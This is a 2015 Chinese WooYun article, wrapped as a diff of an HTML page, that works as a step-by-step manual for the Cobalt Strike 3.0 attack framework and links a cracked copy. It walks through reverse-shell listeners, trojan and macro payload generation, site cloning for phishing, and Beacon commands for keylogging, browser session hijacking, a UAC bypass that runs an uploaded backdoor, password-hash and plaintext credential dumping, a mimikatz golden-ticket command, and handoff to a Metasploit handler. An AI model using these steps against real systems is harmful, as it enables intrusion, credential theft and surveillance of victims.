@@ -1,0 +1,116 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Cobalt strike3.0使用手册</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Evi1cg</a> <span class="bull">·</span> <time title="2015/11/10 11:36" ui-time="" datetime="2015/11/10 11:36" class="published ng-binding ng-isolate-scope">2015/11/10 11:36</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p><img alt="Alt text" img-src="945e410e840c1fa6c2bd138d506e9eb3480a53e3.jpg"></p><h1>0x00 简介</h1><hr><p>Cobalt Strike 一款以metasploit为基础的GUI的框架式渗透工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。而Cobalt Strike 3.0已经不再使用Metasploit框架而作为一个独立的平台使用，当然可以结合Armitage进行使用。这里有一个破解版：</p><blockquote><p>下载地址：<a href="http://pan.baidu.com/s/1o60pRZ0#dirpath=%252FCobalt%2520Strike&amp;path=%252FCobalt%2520Strike">戳我</a>(自行验证其安全性)</p></blockquote><p>Cobalt Strike 3.0 延用了其强大的团体服务器功能，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。当然，在使用Cobalt Strike之前，需要安装java环境，具体怎么配置，请移步&#91;java language="环境搭建"]&#91;/java&#93;<a href="http://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=%08linux%20java%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&amp;oq=%08java%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&amp;rsv_pq=d1bd57b90001a27c&amp;rsv_t=ee9cHC%2FDnpSD3ZsEvIrJ0xE9y6X2rbbbDJqFcWQV3qQzLlo6zooQxKOxCiI&amp;rsv_enter=1&amp;inputT=2121&amp;rsv_sug3=60&amp;rsv_sug1=12&amp;rsv_sug2=0&amp;rsv_sug4=2484">/java</a><a href="http://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=%08linux%20java%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&amp;oq=%08java%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&amp;rsv_pq=d1bd57b90001a27c&amp;rsv_t=ee9cHC%2FDnpSD3ZsEvIrJ0xE9y6X2rbbbDJqFcWQV3qQzLlo6zooQxKOxCiI&amp;rsv_enter=1&amp;inputT=2121&amp;rsv_sug3=60&amp;rsv_sug1=12&amp;rsv_sug2=0&amp;rsv_sug4=2484">3</a>。</p><h1>0x01 运行</h1><hr><p>与之前版本的 Cobalt Strike不同， Cobalt Strike3.0需要开启团体服务器才可以链接使用，当然，这个服务器可以放到公网环境下，或者放到自己想要搭建此服务的环境中。 下载好Cobalt Strike以后包含以下几个文件：</p><p><img alt="Alt text" img-src="ace71bc0f0a835743d227bcd61bde81b5fcaa230.jpg"></p><p>其中关键的文件是teamserver以及cobaltstrike.jar，将这两个文件放到服务器上同一个目录，然后运行：</p><pre><code>☁  cobaltstrike  sudo ./teamserver 192.168.74.1 msf3
+</code></pre><p><img alt="Alt text" img-src="070d027f18cbf1786b757f730d6748aafc6979f8.jpg"></p><blockquote><p>这里为了方便使用，最好使用具体的ip地址，而不是0.0.0.0或者127.0.0.1, 如果有多个网卡，使用你要用的那个ip地址即可，<code>msf3</code> 为该团体服务器的连接密码。</p></blockquote><p>服务运行以后，在客户端进行连接：</p><pre><code>☁  cobaltstrike  java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar $*
+</code></pre><p><img alt="Alt text" img-src="084176b1d74d70fff90c6f35e1874fabfceb9645.jpg"></p><p>这里ip使用服务器的ip，端口默认50050，用户名随意，密码为之前设置的密码，然后connect,弹出验证窗口，然后点是，就进入Cobalt Strike了。</p><p><img alt="Alt text" img-src="ae52f3583c83bf2b3017fc035d323718cc7d098c.jpg"></p><h1>0x02 Listeners</h1><hr><p>使用Cobalt Strike首先需要创建一个Listener,依次点击 Cobalt Strike->Listeners ，然后点击Add便可以创建自己想要的Listeners了，Cobalt Strike3.0包括</p><ul><li>windows/beacon&#95;dns/reverse&#95;dns_txt</li><li>windows/beacon&#95;dns/reverse&#95;http</li><li>windows/beacon&#95;http/reverse&#95;http</li><li>windows/beacon&#95;https/reverse&#95;https</li><li>windows/beacon&#95;smb/bind&#95;pipe</li><li>windows/foreign/reverse&#95;dns&#95;txt</li><li>windows/foreign/reverse_http</li><li>windows/foreign/reverse_https</li><li>windows/foreign/reverse_tcp</li></ul><p>其中<code>windows/beacon*</code> 是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，<code>windows/foreign*</code> 为外部监听器，即msf或者Armitage的监听器。 选择监听器以后，host会自动填写我们开启服务时的ip，配置监听端口，然后保存，监听器就创建好了。</p><h1>0x03 Attacks</h1><hr><p>创建好监听器，下面就需要配置客户端了，Cobalt Strike包括多种攻击方式，其中Packages包括如下几种：</p><p><img alt="Alt text" img-src="a0b2a4fd4a6bc6da51da85597c22574ec5df30b4.jpg"></p><blockquote><p><code>HTML Application</code> 生成恶意的HTA木马文件；</p><p><code>MS Office Macro</code> 生成office宏病毒文件；</p><p><code>Payload Generator</code> 生成各种语言版本的payload;</p><p><code>USB/CD AutoPlay</code> 生成利用自动播放运行的木马文件；</p><p><code>Windows Dropper</code> 捆绑器，能够对文档类进行捆绑；</p><p><code>Windows Executable</code> 生成可执行exe木马；</p><p><code>Windows Executable(S)</code>生成无状态的可执行exe木马。</p></blockquote><p>Web Drive-by（钓鱼攻击）包括如下几个模块：</p><p><img alt="Alt text" img-src="876667c2739dd35786b5ce4e764fe0f24e8be535.jpg"></p><blockquote><p><code>Manage</code>对开启的web服务进行管理；</p><p><code>Clone Site</code> 克隆网站，可以记录受害者提交的数据；</p><p><code>Host File</code> 提供一个文件下载，可以修改Mime信息；</p><p><code>PowerShell Web Delivery</code>类似于msf 的web_delivery ;</p><p><code>Signed Applet Attack</code> 使用java自签名的程序进行钓鱼攻击;</p><p><code>Smart Applet Attack</code> 自动检测java版本并进行攻击，针对Java 1.6.0&#95;45以下以及Java 1.7.0&#95;21以下版本；</p><p><code>System Profiler</code>用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等。</p></blockquote><p>Spear Phish 是用来邮件钓鱼的模块。</p><h1>0x04 View</h1><hr><p><img alt="Alt text" img-src="7a92ccf97742391272040dec6f223a8f28efb8e8.jpg"></p><p>View模块可以方便测试者查看各个模块，图形化的界面可以方便的看到受害者机器的各个信息。</p><blockquote><p><code>Applications</code>显示受害者机器的应用信息；</p><p><code>Credentials</code>显示受害者机器的凭证信息，能更方便的进行后续渗透；</p><p><code>Downloads</code> 文件下载；</p><p><code>Event Log</code>可以看到事件日志，清楚的看到系统的事件,并且团队可以在这里聊天;</p><p><code>Keystrokes</code>查看键盘记录；</p><p><code>Proxy Pivots</code>查看代理信息；</p><p><code>Screenshots</code>查看屏幕截图；</p><p><code>Script Console</code>在这里可以加载各种脚本以增强功能，脚本地址<a href="https://github.com/rsmudge/cortana-scripts">戳我</a>;</p><p><code>Targets</code>查看目标；</p><p><code>Web Log</code>查看web日志。</p></blockquote><p>还有Reporting的功能就不介绍了，主要就是出报告用的。</p><h1>0x05 Beacon</h1><hr><p>Beacon可以选择通过DNS还是HTTP协议出口网络，你甚至可以在使用Beacon通讯过程中切换HTTP和DNS。其支持多主机连接，部署好Beacon后提交一个要连回的域名或主机的列表，Beacon将通过这些主机轮询。目标网络的防护团队必须拦截所有的列表中的主机才可中断和其网络的通讯。</p><p>通过种种方式获取shell以后（比如直接运行生成的exe），就可以使用beacon了，右击电脑，Interact，则可打开Beacon Console;</p><p><img alt="Alt text" img-src="1cb7ce7a816e5ec7eff1f44f50e1071f33b5ca3f.jpg"></p><p>在beacon处输入help，则可以看到详细说明：</p><pre><code>beacon&gt; help    
+
+Beacon Commands
+===============    
+
+    Command                   Description
+    -------                   -----------
+    browserpivot              Setup a browser pivot session 
+    bypassuac                 Spawn a session in a high integrity process
+    cancel                    Cancel a download that's in-progress
+    cd                        Change directory
+    checkin                   Call home and post data
+    clear                     Clear beacon queue
+    covertvpn                 Deploy Covert VPN client
+    desktop                   View and interact with target's desktop
+    dllinject                 Inject a Reflective DLL into a process
+    download                  Download a file
+    downloads                 Lists file downloads in progress
+    drives                    List drives on target
+    elevate                   Try to elevate privileges
+    execute                   Execute a program on target
+    exit                      Terminate the beacon session
+    getsystem                 Attempt to get SYSTEM
+    getuid                    Get User ID
+    hashdump                  Dump password hashes
+    help                      Help menu
+    inject                    Spawn a session in a specific process
+    jobkill                   Kill a long-running post-exploitation task
+    jobs                      List long-running post-exploitation tasks
+    kerberos_ccache_use       Apply kerberos ticket from cache to this session
+    kerberos_ticket_purge     Purge kerberos tickets from this session
+    kerberos_ticket_use       Apply kerberos ticket to this session
+    keylogger                 Inject a keystroke logger into a process
+    kill                      Kill a process
+    link                      Connect to a Beacon peer over SMB
+    logonpasswords            Dump credentials and hashes with mimikatz
+    ls                        List files
+    make_token                Create a token to pass credentials
+    mimikatz                  Runs a mimikatz command
+    mkdir                     Make a directory
+    mode dns                  Use DNS A as data channel (DNS beacon only)
+    mode dns-txt              Use DNS TXT as data channel (DNS beacon only)
+    mode http                 Use HTTP as data channel
+    mode smb                  Use SMB peer-to-peer communication
+    net                       Network and host enumeration tool
+    note                      Assign a note to this Beacon       
+    portscan                  Scan a network for open services
+    powershell                Execute a command via powershell
+    powershell-import         Import a powershell script
+    ps                        Show process list
+    psexec                    Use a service to spawn a session on a host
+    psexec_psh                Use PowerShell to spawn a session on a host
+    pth                       Pass-the-hash using Mimikatz
+    pwd                       Print current directory
+    rev2self                  Revert to original token
+    rm                        Remove a file or folder
+    rportfwd                  Setup a reverse port forward
+    runas                     Execute a program as another user
+    screenshot                Take a screenshot
+    shell                     Execute a command via cmd.exe
+    sleep                     Set beacon sleep time
+    socks                     Start SOCKS4a server to relay traffic
+    socks stop                Stop SOCKS4a server
+    spawn                     Spawn a session 
+    spawnas                   Spawn a session as another user
+    spawnto                   Set executable to spawn processes into
+    steal_token               Steal access token from a process
+    timestomp                 Apply timestamps from one file to another
+    unlink                    Disconnect from parent Beacon
+    upload                    Upload a file
+    wdigest                   Dump plaintext credentials with mimikatz
+    winrm                     Use WinRM to spawn a session on a host
+    wmi                       Use WMI to spawn a session on a host
+</code></pre><p>对于某个模块的使用方式可以直接使用help查看，如：</p><pre><code>beacon&gt; help browserpivot
+Use: browserpivot [pid] [x86|x64]
+     browserpivot [stop]    
+
+Setup a Browser Pivot into the specified process. To hijack authenticated
+web sessions, make sure the process is an Internet Explorer tab. These
+processes have iexplore.exe as their parent process.    
+
+Use "browserpivot stop" to tear down the browser pivoting sessions 
+associated with this Beacon.
+</code></pre><p>下面主要介绍几个好玩儿的功能。这里为了能快速显示结果，可以设置</p><pre><code>beacon&gt;sleep 0
+</code></pre><h2>0x051 Browserpivot</h2><p>用户注入受害者浏览器进程，然后开启HTTP代理，之后就可以登录受害者登录的网站了。</p><p>使用方式，ps找到浏览器进程：</p><p><img alt="Alt text" img-src="2fd63aca9c6780f61f5f435e459ec611111456cb.jpg"></p><p>注入进程：</p><pre><code>beacon&gt; browserpivot 3452 x64
+</code></pre><p><img alt="Alt text" img-src="121c5e64940d12713d3aadc2c0eac8249861b404.jpg"></p><p>设置本地浏览器代理：</p><p><img alt="Alt text" img-src="46939f45bff9a89f621fe3d4cf1b683bacdccdb7.jpg"></p><p>当受害者登录某网站账号以后，通过代理，本机浏览器同样登录该网站:</p><p><img alt="Alt text" img-src="d974da644a75dc98b5ea787e7e3f1f5b5360237a.jpg"></p><p>当然当被攻击者关闭浏览器的时候，代理也就失效了，关闭此代理可使用如下命令：</p><pre><code>browserpivot stop
+</code></pre><h2>0x052 Socks</h2><p>可以直接开启socks4a代理，可以通过代理进行内网渗透测试。</p><p>开启socks</p><pre><code>beacon&gt;socks 9999
+</code></pre><blockquote><p>这里可以选择其中一台，右键Pivoting->SOCKS Server，则使用此台计算机开启socks代理。</p></blockquote><p>配置proxychains.conf，添加</p><pre><code>socks4 127.0.0.1 9999
+</code></pre><p>然后就可以通过proxychains 使用各种工具做内网渗透了。</p><p>或者直接开启隧道使用msf，依次点击View->Proxy Pivots，选择Socks4a Proxy,点击Tunnel:</p><p><img alt="Alt text" img-src="88e74afb46dc9ccf94b21fe585cb30f11aea7e05.jpg"></p><p>复制以后，在msf中执行，则可以开启代理：</p><p><img alt="Alt text" img-src="468c46c1d9a0578dd908b31eabed7a6b15c4e8b4.jpg"></p><p>关闭socks</p><pre><code>beacon&gt;socks stop
+</code></pre><h2>0x053 Screenshot&amp;Keylogger</h2><p>这里的screenshot可以截取受害者一定时间的屏幕截图，操作命令为：</p><pre><code>beacon&gt;screenshot [pid] &lt;x86|x64&gt; [run time in seconds]
+</code></pre><p>或者</p><pre><code>beacon&gt;screenshot
+</code></pre><p>然后打开View->Screenshots，则可以看到屏幕截图：</p><p><img alt="Alt text" img-src="d8b1731f6263a7043140ba6b4a61107039240a5d.jpg"></p><p>键盘记录器的使用方式为：</p><pre><code>Use: keylogger [pid] &lt;x86|x64&gt;
+</code></pre><p>然后打开View->Keystrokes，则可以看到键盘记录结果：</p><p><img alt="Alt text" img-src="2bb455e23603aab26de0028f6c4d11b213030b76.jpg"></p><p>如果不想使用命令行，可以直接选择受害者计算机（可多选），右键->Explore->Process List：</p><p><img alt="Alt text" img-src="b362c3caec5ef2c405dc5685af9547f8c7781440.jpg"></p><h2>0x054 powershell-import</h2><p>这个功能在后渗透测试中很有用，可以导入各种powershell渗透框架，比如nishang的powerpreter，直接执行：</p><pre><code>beacon&gt; powershell-import
+</code></pre><p>然后在文件浏览器里面选择 Powerpreter.psm1：</p><p><img alt="Alt text" img-src="f8c9dd8a705099ff4afe86b66065bd66a730b840.jpg"></p><p>或者直接执行：</p><pre><code>powershell-import [/path/to/local/script.ps1]
+</code></pre><p>进行导入，之后就可以使用powerpreter的各种模块了。</p><p>要执行某模块直接使用如下命令,比如：</p><pre><code>beacon&gt; powershell Check-VM
+</code></pre><p><img alt="Alt text" img-src="b69fc952598903c1992720d454eaee3335cfc0b8.jpg"></p><p>关于powerpreter之前在zone有简单的介绍，<a href="http://zone.wooyun.org/content/23311"><code>powershell</code>后渗透框架 powerpreter</a>。</p><h2>0x055 kerberos相关</h2><p>这里一共有三个模块，分别是：</p><ul><li>kerberos&#95;ccache&#95;use :从ccache文件中导入票据</li><li>kerberos&#95;ticket&#95;purge :清除当前会话的票据</li><li>kerberos&#95;ticket&#95;use：从ticket文件中导入票据</li></ul><p>获取黄金票据的方式比如使用mimikatz:</p><pre><code>kerberos::golden /admin:USER /domain:DOMAIN /sid:SID /krbtgt:HASH /ticket:FILE
+</code></pre><p>乌云关于kerberos也有相关文章，有兴趣的可以看一下：</p><ul><li><a href="http://drops.wooyun.org/tips/7547">内网渗透中的mimikatz</a></li><li><a href="http://drops.wooyun.org/tips/9591">域渗透的金之钥匙</a></li></ul><p>据说这个在域渗透中很有用哟~</p><h2>0x056 BypassUAC</h2><p>什么，你不能读密码？试试bypassuac吧~</p><p>直接执行</p><pre><code>beacon&gt; bypassuac
+</code></pre><p>下面你就可以执行那些需要最高权限的操作了。</p><p>这一块在测试Win10的时候并没有成功，关于Win10的bypassuac我在博客里面也有相关介绍，详情:<a href="http://evi1cg.me/archives/Powershell_Bypass_UAC.html">戳我呀</a></p><p>在这里就演示使用bypassuac的powershell脚本来获取Win10最高权限，由于nishang的powershell脚本现在并不支持Win10,所以这里使用了一个我修改的powershell脚本 <a href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/invoke-BypassUAC.ps1">invoke-BypassUAC.ps1</a></p><p>生成一个beacon后门：</p><p><img alt="Alt text" img-src="ce4e4a5dbb2ae27a31523f5f3caf0a19c7936a76.jpg"></p><p>上传后门：</p><pre><code>beacon&gt; cd E:
+beacon&gt; upload /Users/evi1cg/Desktop/test.exe 
+</code></pre><p>加载powershell执行后门：</p><pre><code>beacon&gt; powershell-import /Users/evi1cg/Pentest/Powershell/MyShell/invoke-BypassUAC.ps1
+beacon&gt; powershell Invoke-BypassUAC -Command 'E:\test.exe'
+</code></pre><p>然后他就破了：</p><p><img alt="Alt text" img-src="ee569b9acbda20597631b66d1d444ff93ee3e858.jpg"></p><p>使用那个破了的电脑的beacon读取密码：</p><pre><code>beacon&gt; sleep 0
+beacon&gt; wdigest
+</code></pre><p><img alt="Alt text" img-src="81a850cbf77cfc0bd45ff2f97c740357e1403270.jpg"></p><pre><code>beacon&gt; hashdump
+</code></pre><p><img alt="Alt text" img-src="d303b963bc18993164cfa0cc92631c9791bfb54d.jpg"></p><h1>0x06 与msf联动</h1><hr><p>cobalt strike3.0 不再使用Metasploit框架而作为一个独立的平台使用，那么怎么通过cobalt strike获取到meterpreter呢，别担心，可以做到的。 首先我们使用msf的reverse_tcp开启监听模式：</p><pre><code>msf &gt; use exploit/multi/handler 
+msf exploit(handler) &gt; set payload windows/meterpreter
+msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set lhost 192.168.74.1 
+lhost =&gt; 192.168.74.1
+msf exploit(handler) &gt; set lport 5555
+lport =&gt; 5555
+msf exploit(handler) &gt; exploit -j
+</code></pre><p>之后使用Cobalt Strike创建一个windows/foreign/reverse_tcp Listener：</p><p><img alt="Alt text" img-src="79d8a225afef4733753ddcee002e360fc196db78.jpg"></p><p>其中ip为msf的ip地址，端口为msf所监听的端口。<br>然后选中计算机，右键->Spawn:</p><p><img alt="Alt text" img-src="ebe489b2b7bc583befdb19fdd82e2ed33127cec8.jpg"></p><p>选择刚刚创建的监听器：</p><p><img alt="Alt text" img-src="9c2510cd0a2e446884b17cf8967224f1da9b1271.jpg"></p><p>可以看到成功获取了meterpreter回话：</p><p><img alt="Alt text" img-src="90637e9541ccf6008a780473bba4fbe9ef6ecc76.jpg"></p><h1>0x07 小结</h1><hr><p>此次测试使用<code>windows/beacon_http/reverse_http</code>来进行，具体DNS的监听器请参考luom所写<a href="http://drops.wooyun.org/tools/1475">Cobalt Strike 之团队服务器的搭建与DNS通讯演示</a>，本篇文章只是介绍了Cobalt Strike的部分功能，如有错误，请各位大牛指正，关于Cobalt Strike其他的功能小伙伴们可以自己研究，如果可能的话，我也会对其进行补充。希望对各位小伙伴有用。</p><p>本文由evi1cg原创并首发于乌云drops，转载请注明</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tools/1475" rel="bookmark" id="re1">Cobalt Strike 之团队服务器的搭建与DNS通讯演示</a></li><li><a href="http://drops.wooyun.org/tips/2420" rel="bookmark" id="re2">下载文件的15种方法</a></li><li><a href="http://drops.wooyun.org/tips/3353" rel="bookmark" id="re3">Powershell tricks::Bypass AV</a></li><li><a href="http://drops.wooyun.org/tips/12354" rel="bookmark" id="re4">Powershell之MOF后门</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Nt</span> <span class="reply-time">2016-05-29 12:24:21</span></div><p></p><p>请问一下，中文目录乱码的问题怎么解决啊？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mtfly</span> <span class="reply-time">2015-12-18 16:49:30</span></div><p></p><p>@G9sT的测试 慢慢脱离出来，编程一个远控了。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">G9sT的测试</span> <span class="reply-time">2015-12-07 13:37:15</span></div><p></p><p>我想问问自动扫描自动溢出的功能去哪了? 没有这些功能,要这即把有啥用? 灰鸽子不比他强?</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">c4bbage</span> <span class="reply-time">2015-11-12 21:42:06</span></div><p></p><p>@HRay 看来有不少人关注beacon，heacon c2 named pipe 是挺不错的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">带脚镣跳舞</span> <span class="weibo"></span> <span class="reply-time">2015-11-11 09:32:54</span></div><p></p><p>→_→</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Evi1cg</span> <span class="reply-time">2015-11-10 21:19:09</span></div><p></p><p>@HRay 恩，写的不全，还在继续学习，有机会再补充。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">HRay</span> <span class="reply-time">2015-11-10 14:34:31</span></div><p></p><p>文章并没有提到c2操作，beacon的强大之处在于弹性c2 , 另外也没有讲到smb pipe的应用..</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Sslsec</span> <span class="reply-time">2015-11-10 14:16:45</span></div><p></p><p>霸一个沙发</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">c4bbage</span> <span class="reply-time">2015-11-10 13:10:47</span></div><p></p><p>厉害，相当于把官方的beacon文档翻译了一遍+操作演示。赞</p><p></p></div></div></div></div></div></main>
